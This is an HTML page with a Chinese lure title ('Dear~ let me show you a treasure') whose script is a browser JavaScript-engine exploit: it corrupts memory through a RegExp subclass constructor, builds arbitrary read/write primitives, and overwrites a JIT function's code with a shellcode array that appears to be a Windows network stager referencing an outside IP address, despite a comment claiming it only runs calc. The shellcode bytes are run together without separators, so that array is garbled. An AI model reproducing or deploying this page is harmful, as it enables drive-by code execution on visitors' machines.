<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
</head>
<h1>亲~给你看个宝贝</h1>
<script>
ENABLE_LOG = true;
IN_WORKER = true;
// run calc and hang in a loop
var shellcode = [0xfc0xe80x890x000x000x000x600x890xe50x310xd20x640x8b0x520x300x8b0x520x0c0x8b0x520x140x8b0x720x280x0f0xb70x4a0x260x310xff0x310xc00xac0x3c0x610x7c0x020x2c0x200xc10xcf0x0d0x010xc70xe20xf00x520x570x8b0x520x100x8b0x420x3c0x010xd00x8b0x400x780x850xc00x740x4a0x010xd00x500x8b0x480x180x8b0x580x200x010xd30xe30x3c0x490x8b0x340x8b0x010xd60x310xff0x310xc00xac0xc10xcf0x0d0x010xc70x380xe00x750xf40x030x7d0xf80x3b0x7d0x240x750xe20x580x8b0x580x240x010xd30x660x8b0x0c0x4b0x8b0x580x1c0x010xd30x8b0x040x8b0x010xd00x890x440x240x240x5b0x5b0x610x590x5a0x510xff0xe00x580x5f0x5a0x8b0x120xeb0x860x5d0x680x6e0x650x740x000x680x770x690x6e0x690x540x680x4c0x770x260x070xff0xd50x310xff0x570x570x570x570x570x680x3a0x560x790xa70xff0xd50xe90x840x000x000x000x5b0x310xc90x510x510x6a0x030x510x510x680x980x1f0x000x000x530x500x680x570x890x9f0xc60xff0xd50xeb0x700x5b0x310xd20x520x680x000x020x400x840x520x520x520x530x520x500x680xeb0x550x2e0x3b0xff0xd50x890xc60x830xc30x500x310xff0x570x570x6a0xff0x530x560x680x2d0x060x180x7b0xff0xd50x850xc00x0f0x840xc30x010x000x000x310xff0x850xf60x740x040x890xf90xeb0x090x680xaa0xc50xe20x5d0xff0xd50x890xc10x680x450x210x5e0x310xff0xd50x310xff0x570x6a0x070x510x560x500x680xb70x570xe00x0b0xff0xd50xbf0x000x2f0x000x000x390xc70x740xb70x310xff0xe90x910x010x000x000xe90xc90x010x000x000xe80x8b0xff0xff0xff0x2f0x5a0x510x6e0x430x000x350x4f0x210x500x250x400x410x500x5b0x340x5c0x500x5a0x580x350x340x280x500x5e0x290x370x430x430x290x370x7d0x240x450x490x430x410x520x2d0x530x540x410x4e0x440x410x520x440x2d0x410x4e0x540x490x560x490x520x550x530x2d0x540x450x530x540x2d0x460x490x4c0x450x210x240x480x2b0x480x2a0x000x350x4f0x210x500x250x000x550x730x650x720x2d0x410x670x650x6e0x740x3a0x200x4d0x6f0x7a0x690x6c0x6c0x610x2f0x350x2e0x300x200x280x630x6f0x6d0x700x610x740x690x620x6c0x650x3b0x200x4d0x530x490x450x200x390x2e0x300x3b0x200x570x690x6e0x640x6f0x770x730x200x4e0x540x200x360x2e0x310x3b0x200x540x720x690x640x650x6e0x740x2f0x350x2e0x300x3b0x200x420x4f0x490x450x390x3b0x450x4e0x550x530x4d0x530x430x4f0x4d0x290x0d0x0a0x000x350x4f0x210x500x250x400x410x500x5b0x340x5c0x500x5a0x580x350x340x280x500x5e0x290x370x430x430x290x370x7d0x240x450x490x430x410x520x2d0x530x540x410x4e0x440x410x520x440x2d0x410x4e0x540x490x560x490x520x550x530x2d0x540x450x530x540x2d0x460x490x4c0x450x210x240x480x2b0x480x2a0x000x350x4f0x210x500x250x400x410x500x5b0x340x5c0x500x5a0x580x350x340x280x500x5e0x290x370x430x430x290x370x7d0x240x450x490x430x410x520x2d0x530x540x410x4e0x440x410x520x440x2d0x410x4e0x540x490x560x490x520x550x530x2d0x540x450x530x540x2d0x460x490x4c0x450x210x240x480x2b0x480x2a0x000x350x4f0x210x500x250x400x410x500x5b0x340x5c0x500x5a0x580x350x340x280x500x5e0x290x370x430x430x290x370x7d0x240x450x490x430x410x520x2d0x530x540x410x4e0x440x410x520x440x2d0x410x4e0x540x490x560x490x520x550x530x2d0x540x450x530x540x2d0x460x490x4c0x450x210x240x480x2b0x480x2a0x000x350x4f0x210x500x000x680xf00xb50xa20x560xff0xd50x6a0x400x680x000x100x000x000x680x000x000x400x000x570x680x580xa40x530xe50xff0xd50x930xb90x000x000x000x000x010xd90x510x530x890xe70x570x680x000x200x000x000x530x560x680x120x960x890xe20xff0xd50x850xc00x740xc60x8b0x070x010xc30x850xc00x750xe50x580xc30xe80xa90xfd0xff0xff0x380x320x2e0x310x350x360x2e0x320x380x2e0x320x320x340x000x000x000x000x00];
function print(data) {
}
var not_optimised_out = 0;
var target_function = (function (value) {
    if (value == 0xdecaf0) {
        not_optimised_out += 1;
    }
    not_optimised_out += 1;
    not_optimised_out |= 0xff;
    not_optimised_out *= 12;
});
for (var i = 0; i < 0x10000; ++i) {
    target_function(i);
}
var g_array;
var tDerivedNCount = 17 * 87481 - 8;
var tDerivedNDepth = 19 * 19;
function cb(flag) {
    if (flag == true) {
        return;
    }
    g_array = new Array(0);
    g_array[0] = 0x1dbabe * 2;
    return 'c01db33f';
}
function gc() {
    for (var i = 0; i < 0x10000; ++i) {
        new String();
    }
}
function oobAccess() {
    var this_ = this;
    this.buffer = null;
    this.buffer_view = null;
    this.page_buffer = null;
    this.page_view = null;
    this.prevent_opt = [];
    var kSlotOffset = 0x1f;
    var kBackingStoreOffset = 0xf;
    class LeakArrayBuffer extends ArrayBuffer {
        constructor() {
            super(0x1000);
            this.slot = this;
        }
    }
    this.page_buffer = new LeakArrayBuffer();
    this.page_view = new DataView(this.page_buffer);
    new RegExp({ toString: function () { return 'a' } });
    cb(true);
    class DerivedBase extends RegExp {
        constructor() {
            // var array = null;
            super(
                // at this point, the 4-byte allocation for the JSRegExp `this` object
                // has just happened.
                {
                    toString: cb
                }, 'g'
                // now the runtime JSRegExp constructor is called, corrupting the
                // JSArray.
            );
            // this allocation will now directly follow the FixedArray allocation
            // made for `this.data`, which is where `array.elements` points to.
            this_.buffer = new ArrayBuffer(0x80);
            g_array[8] = this_.page_buffer;
        }
    }
    // try{
    var derived_n = eval(`(function derived_n(i) {
        if (i == 0) {
            return DerivedBase;
        }
        class DerivedN extends derived_n(i-1) {
            constructor() {
                super();
                return;
                ${"this.a=0;".repeat(tDerivedNCount)}
            }
        }
        return DerivedN;
    })`);
    gc();
    new (derived_n(tDerivedNDepth))();
    this.buffer_view = new DataView(this.buffer);
    this.leakPtr = function (obj) {
        this.page_buffer.slot = obj;
        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);
    }
    this.setPtr = function (addr) {
        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);
    }
    this.read32 = function (addr) {
        this.setPtr(addr);
        return this.page_view.getUint32(0, true, ...this.prevent_opt);
    }
    this.write32 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint32(0, value, true, ...this.prevent_opt);
    }
    this.write8 = function (addr, value) {
        this.setPtr(addr);
        this.page_view.setUint8(0, value, ...this.prevent_opt);
    }
    this.setBytes = function (addr, content) {
        for (var i = 0; i < content.length; i++) {
            this.write8(addr + i, content[i]);
        }
    }
    return this;
}
function trigger() {
    var oob = oobAccess();
    var func_ptr = oob.leakPtr(target_function);
    print('[*] target_function at 0x' + func_ptr.toString(16));
    var kCodeInsOffset = 0x1b;
    var code_addr = oob.read32(func_ptr + kCodeInsOffset);
    print('[*] code_addr at 0x' + code_addr.toString(16));
    oob.setBytes(code_addr, shellcode);
    target_function(0);
}
try{
    print("start running");
    trigger();
}catch(e){
    print(e);
}
</script>